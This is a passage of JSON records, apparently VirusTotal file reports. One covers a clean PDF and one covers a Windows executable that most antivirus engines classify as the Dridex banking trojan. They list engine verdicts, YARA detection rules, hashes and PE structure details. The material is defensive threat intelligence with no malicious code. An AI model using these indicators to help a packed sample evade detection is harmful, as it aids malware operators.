          "method": "blacklist",
          "engine_update": "20231021"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Varist": {
          "category": "undetected",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2023.8.30.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23090.2007",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.143.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36104",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231021"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231017"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "A:25.36700B:27.33591",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Google": {
          "category": "undetected",
          "engine_name": "Google",
          "engine_version": "1697986853",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230921"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231021"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231019"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231018"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231021"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231011"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231022"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        }
      },
      "trid": [
        {
          "file_type": "Adobe Portable Document Format",
          "probability": 100
        }
      ],
      "sandbox_verdicts": {
        "DOCGuard": {
          "category": "harmless",
          "sandbox_name": "DOCGuard",
          "malware_classification": [
            "CLEAN"
          ]
        }
      },
      "sha256": "0061b8bce47d111a27a95e2c6f3dc40a9afbeb4fb2b155eb7a8db33cd192bbcb",
      "tags": [
        "pdf"
      ],
      "last_analysis_date": 1697990739,
      "unique_sources": 1,
      "first_submission_date": 1697990739,
      "ssdeep": "6144:j3UdE0pW9TpYitpW5rcHVFH0nqnBiXK68HsD0h:zUS0pW9CiC581nQSsD0h",
      "md5": "ae4357c666e75f82efc3d9e29e2659e6",
      "sha1": "85e1b859de999e86dfae072bd99fc0d78c4aeeca",
      "magic": "PDF document, version 1.5, 18 pages",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 15,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 0,
        "undetected": 61
      },
      "meaningful_name": "09-FH-051.pdf",
      "reputation": 0,
      "names": [
        "09-FH-051.pdf"
      ]
    },
    "type": "file",
    "id": "0061b8bce47d111a27a95e2c6f3dc40a9afbeb4fb2b155eb7a8db33cd192bbcb",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/0061b8bce47d111a27a95e2c6f3dc40a9afbeb4fb2b155eb7a8db33cd192bbcb"
    }
  }
},
{
  "_id": {
    "$oid": "65bac5ff0e994d74c761c850"
  },
  "data": {
    "id": "178ba564b39bd07577e974a9b677dfd86ffa1f1d0299dfd958eb883c5ef6c3e1",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/178ba564b39bd07577e974a9b677dfd86ffa1f1d0299dfd958eb883c5ef6c3e1"
    },
    "attributes": {
      "tlsh": "T1502412F8CB7AA4C6ED97553220A12527FF6E7C36D611C1668C1711E9E68D7CC2E30712",
      "names": [
        "Trojan.exe",
        "npkpdb.dll",
        "178ba564b39bd07577e974a9b677dfd86ffa1f1d0299dfd958eb883c5ef6c3e1.exe",
        "dridexexe.exe",
        "dridex.exe",
        "dridex_packed.exe",
        "dridex.bin",
        "sample_1.exe",
        "178ba564b39bd07577e974a9b677dfd86ffa1f1d0299dfd958eb883c5ef6c3e1.txt",
        "frix.exe",
        "kfuofwk.exe",
        "HG0WAP5S.exe"
      ],
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "Yara rule that detects Dridex trojan.",
          "author": "ReversingLabs",
          "ruleset_name": "Win32.Trojan.Dridex",
          "rule_name": "Win32_Trojan_Dridex",
          "ruleset_id": "0057c3c63b",
          "match_in_subfile": true,
          "source": "https://github.com/reversinglabs/reversinglabs-yara-rules"
        },
        {
          "description": "Heaven's Gate: Switch from 32-bit to 64-mode",
          "author": "kevoreilly",
          "ruleset_name": "HeavensGate",
          "rule_name": "HeavensGate",
          "ruleset_id": "00b99a8c22",
          "match_in_subfile": true,
          "source": "https://github.com/kevoreilly/CAPEv2"
        },
        {
          "description": "Detects aPLib decompression code often used in malware",
          "author": "@r3c0nst",
          "ruleset_name": "aPLib_decompression",
          "rule_name": "aPLib_decompression",
          "ruleset_id": "00d70358a4",
          "match_in_subfile": true,
          "source": "https://github.com/fboldewin/YARA-rules"
        },
        {
          "description": "Detects win.dridex.",
          "author": "Felix Bilstein - yara-signator at cocacoding dot com",
          "ruleset_name": "win.dridex_auto",
          "rule_name": "win_dridex_auto",
          "ruleset_id": "008dab25f7",
          "match_in_subfile": true,
          "source": "https://malpedia.caad.fkie.fraunhofer.de/"
        }
      ],
      "pe_info": {
        "timestamp": 1587693851,
        "imphash": "7ebef1081a372c6e6f289d7c633f4f3a",
        "machine_type": 332,
        "entry_point": 13299,
        "resource_details": [
          {
            "lang": "KOREAN",
            "chi2": 126534.77,
            "filetype": "unknown",
            "entropy": 0.23342204093933105,
            "sha256": "6c4215104adbed0f4cf819843f5bce8459df503d079d4dcda3118a7b6df9f29d",
            "type": "RC_BINARY"
          },
          {
            "lang": "KOREAN",
            "chi2": 86208.62,
            "filetype": "unknown",
            "entropy": 3.411677598953247,
            "sha256": "da7a24e9dbfbb0d480e03799d2824982e4157c6910cd5a4f572d226c0dd35212",
            "type": "RT_VERSION"
          }
        ],
        "resource_langs": {
          "KOREAN": 2
        },
        "resource_types": {
          "RT_VERSION": 1,
          "RC_BINARY": 1
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 323959.12,
            "virtual_address": 4096,
            "flags": "rx",
            "raw_size": 12288,
            "entropy": 5.55,
            "virtual_size": 9506,
            "md5": "2beff64e83a6fbea8faea9ce62c52540"
          },
          {
            "name": ".rdata",
            "chi2": 469930.75,
            "virtual_address": 16384,
            "flags": "r",
            "raw_size": 4096,
            "entropy": 3.21,
            "virtual_size": 3204,
            "md5": "0f67a53053662e4145d8dceb8ec46e1b"
          },
          {
            "name": ".data",
            "chi2": 1031721.25,
            "virtual_address": 20480,
            "flags": "rw",
            "raw_size": 4096,
            "entropy": 0.08,
            "virtual_size": 4292,
            "md5": "71a972565cfece93d019f0fc9eb499d4"
          },
          {
            "name": ".text1",
            "chi2": 24233.33,
            "virtual_address": 28672,
            "flags": "rw",
            "raw_size": 180224,
            "entropy": 7.96,
            "virtual_size": 179563,
            "md5": "2560f32537175b0bfb81dc51834f6997"
          },
          {
            "name": ".rsrc",
            "chi2": 781887.62,
            "virtual_address": 208896,
            "flags": "r",
            "raw_size": 4096,
            "entropy": 1.32,
            "virtual_size": 1816,
            "md5": "97e13f1cd3306dfa1d93ab4224b92e52"
          },
          {
            "name": ".reloc",
            "chi2": 925795.38,
            "virtual_address": 212992,
            "flags": "r",
            "raw_size": 4096,
            "entropy": 0.66,
            "virtual_size": 276,
            "md5": "edca5cc7b15bbed0ec17a64240722e38"
          }
        ],
        "exports": [
          "BpfrBpdm16"
        ],
        "compiler_product_versions": [
          "[LNK] VS2010 SP1 build 40219 count=383",
          "[LNK] VS2015 UPD2 build 23918 count=334",
          "[RES] VS2005 build 50727 count=505",
          "[LNK] VS2012 build 50727 count=85",
          "[RES] VS2010 SP1 build 40219 count=166",
          "[LNK] VS2015 UPD3 build 24213 count=40",
          "[ C ] VS2015 [14.0] build 23026 count=179",
          "[IMP] VS2013 UPD5 build 40629 count=178",
          "[ASM] VS2013 UPD4 build 31101 count=375",
          "[LNK] VS2012 UPD4 build 61030 count=90",
          "[IMP] VS2015 [14.0] build 23026 count=171",
          "[LNK] VS2015 [14.0] build 23026 count=394",
          "[IMP] VS2010 build 30319 count=495",
          "[LNK] VS2015 UPD3 build 24213 count=146",
          "[C++] VS2013 UPD4 build 31101 count=228",
          "[RES] VS2017 v15.5.4 build 25834 count=76",
          "[ C ] VS2013 UPD5 build 40629 count=69",
          "[ C ] VS2008 SP1 build 30729 count=472",
          "[ASM] VS2012 UPD3 build 60610 count=430",
          "[LNK] VS2008 build 21022 count=14",
          "[IMP] VS2012 UPD3 build 60610 count=101",
          "[ C ] VS2012 build 50727 count=69",
          "[ C ] VS2015 UPD3.1 build 24215 count=222",
          "[EXP] VS2012 build 50727 count=51",
          "[ C ] VS2013 UPD2 build 30501 count=143",
          "[LNK] VS2013 UPD4 build 31101 count=375",
          "[ASM] VS2015 UPD3 build 24210 count=420",
          "[EXP] VS2012 build 50727 count=211",
          "[ C ] VS2013 UPD5 build 40629 count=335",
          "[C++] VS2010 SP1 build 40219 count=319",
          "[C++] VS2013 UPD4 build 31101 count=216",
          "[RES] VS2013 build 21005 count=41"
        ],
        "rich_pe_header_hash": "a08e6e4e71a4e9438fd0f44de4641ca7",
        "import_list": [
          {
            "library_name": "SHLWAPI.dll",
            "imported_functions": [
              "SHDeleteKeyA",
              "SHGetValueA"
            ]
          },
          {
            "library_name": "pdh.dll",
            "imported_functions": [
              "PdhExpandWildCardPathW"
            ]
          },
          {
            "library_name": "WININET.dll",
            "imported_functions": [
              "InternetCombineUrlA"
            ]
          },
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "ExitProcess",
              "GetLastError",
              "GetModuleFileNameA",
              "GetModuleHandleW",
              "LoadLibraryExW"
            ]
          },
          {
            "library_name": "msvcrt.dll",
            "imported_functions": [
              "isalpha"
            ]
          },
          {
            "library_name": "OLEAUT32.dll",
            "imported_functions": [
              "VarI2FromDate"
            ]
          },
          {
            "library_name": "ADVAPI32.dll",
            "imported_functions": [
              "PrivilegeCheck"
            ]
          },
          {
            "library_name": "RPCRT4.dll",
            "imported_functions": [
              "I_RpcNsInterfaceExported"
            ]
          },
          {
            "library_name": "SETUPAPI.dll",
            "imported_functions": [
              "SetupDuplicateDiskSpaceListW"
            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "FindWindowExW",
              "GetQueueStatus",
              "GetScrollPos"
            ]
          }
        ]
      },
      "authentihash": "aeddcf92ff47f7b02aa98118e152ba71a3995b9fe439ee1e37c1d4e1b7d56f0c",
      "reputation": -2,
      "type_description": "Win32 EXE",
      "last_analysis_stats": {
        "malicious": 54,
        "suspicious": 0,
        "undetected": 14,
        "harmless": 0,
        "timeout": 1,
        "confirmed-timeout": 0,
        "failure": 0,
        "type-unsupported": 4
      },
      "meaningful_name": "npkpdb.dll",
      "signature_info": {
        "product": "nProtect KeyCrypt Program Database DLL",
        "description": "nProtect KeyCrypt Program Database DLL",
        "file version": "2003, 10, 1, 1",
        "original name": "npkpdb.dll",
        "comments": "nProtect KeyCrypt Program Database DLL",
        "internal name": "npkpdb.dll",
        "copyright": "Copyright (C) INCA Internet. 2000-2003"
      },
      "sandbox_verdicts": {
        "Yomi Hunter": {
          "category": "malicious",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "MALWARE"
          ]
        },
        "Lastline": {
          "category": "malicious",
          "sandbox_name": "Lastline",
          "malware_classification": [
            "MALWARE",
            "TROJAN"
          ]
        }
      },
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "info": "C",
            "version": "19.00.24215",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "9.00.21022",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "version": "2008",
            "type": "Tool",
            "name": "Visual Studio"
          }
        ]
      },
      "creation_date": 1587693851,
      "bytehero_info": "Trojan.Win32.Heur.Gen",
      "size": 212992,
      "unique_sources": 20,
      "last_submission_date": 1705400924,
      "md5": "6a8401448a5bd2b540850f811b20a66d",
      "times_submitted": 25,
      "type_extension": "exe",
      "first_submission_date": 1587662749,
      "total_votes": {
        "harmless": 4,
        "malicious": 6
      },
      "ssdeep": "3072:KNrKrKlirGivgt0OpAIL7IDr64J/GUAowkofDHSUEMFOfWH/iqIHWHRvVg:aOrciYKBIIPGU9wkgSUPFOwtHL",
      "type_tag": "peexe",
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "W32.AIDetectMalware"
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan.Win32.Zenpak.4!c"
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "malicious (high confidence)"
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Gen:Variant.Graftor.738749"
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "engine_update": "20240116",
          "category": "undetected",
          "result": null
        },
        "CMC": {
          "method": "blacklist",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "engine_update": "20240106",
          "category": "undetected",
          "result": null
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "engine_update": "20240115",
          "category": "undetected",
          "result": null
        },
        "Skyhigh": {
          "method": "blacklist",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "BehavesLike.Win32.Drixed.dc"
        },
        "McAfee": {
          "method": "blacklist",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Drixed-FJN!6A8401448A5B"
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "engine_update": "20240103",
          "category": "malicious",
          "result": "unsafe"
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "Gen:Variant.Graftor.738749"
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "Trojan.Win32.Save.a"
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.135.50750",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan ( 00549d461 )"
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "malicious",
          "result": "Trojan:Win32/Zenpak.9ebf7b1b"
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.135.50749",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan ( 00549d461 )"
        },
        "Cybereason": {
          "method": "blacklist",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "engine_update": "20231102",
          "category": "malicious",
          "result": "malicious.42c495"
        },
        "BitDefenderTheta": {
          "method": "blacklist",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "engine_update": "20240103",
          "category": "malicious",
          "result": "Gen:NN.ZexaF.36680.ny0@aW@Q1GlG"
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.618",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "Trojan.Win32.Stealer.CDP"
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "Packed.Generic.553"
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Generic.Malware"
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "28577",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "a variant of Win32/Kryptik.HDJN"
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20240116",
          "category": "undetected",
          "result": null
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.490",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Malicious"
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20240116",
          "category": "undetected",
          "result": null
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Malicious (score: 100)"
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "HEUR:Trojan.Win32.Zenpak.vho"
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Gen:Variant.Graftor.738749"
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan.Win32.Zenpak.iovkbm"
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20240115",
          "category": "undetected",
          "result": null
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Win32:TrojanX-gen [Trj]"
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan.Generic@AI.85 (RDMK:sEHKVdvgERcrGhc7lYPPEg)"
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Gen:Variant.Graftor.738749 (B)"
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Heuristic.HEUR/AGEN.1311213"
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan.Dridex.693"
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5034",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "Trojan.Kryptik.Win32.2009423"
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "TrojanSpy.Win32.DRIDEX.SMXE"
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "Mal/EncPk-APX"
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan.Win32.Krypt"
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20240116",
          "category": "undetected",
          "result": null
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "W32.Trojan.Gen"
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "HEUR/AGEN.1311213"
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan/Win32.Zenpak"
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "engine_update": "20230906",
          "category": "undetected",
          "result": null
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan:Win32/Zenpak.GUF!MTB"
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.155.174",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan.Win32.Packed.vb!s1"
        },
        "Xcitium": {
          "method": "blacklist",
          "engine_name": "Xcitium",
          "engine_version": "36350",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "Malware@#3qfs81qabbdwd"
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan.Graftor.DB45BD"
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20240116",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "HEUR:Trojan.Win32.Zenpak.vho"
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "A:25.37175B:27.34584",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Gen:Variant.Graftor.738749"
        },
        "Varist": {
          "method": "blacklist",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "W32/ABTrojan.CYGA-4749"
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Malware/Win32.Generic.C4094147"
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "engine_update": "20230828",
          "category": "undetected",
          "result": null
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "engine_update": "20240116",
          "category": "undetected",
          "result": null
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.7",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Spyware.Banker.Dridex"
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-16.02",
          "engine_update": "20240116",
          "category": "undetected",
          "result": null
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan.Crypt"
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "Trj/CI.A"
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "TrojanSpy.Win32.DRIDEX.SMXE"
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Malware.Win32.Gencirc.13b2f23d"
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20240116",
          "category": "undetected",
          "result": null
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "engine_update": "20231119",
          "category": "malicious",
          "result": "Static AI - Malicious PE"
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Trojan.Malware.1728101.susgen"
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "W32/GenKryptik.EJPK!tr"
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "Win32:TrojanX-gen [Trj]"
        },
        "DeepInstinct": {
          "method": "blacklist",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "engine_update": "20240116",
          "category": "malicious",
          "result": "MALICIOUS"
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20231026",
          "category": "malicious",
          "result": "win/malicious_confidence_100% (W)"
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": null,
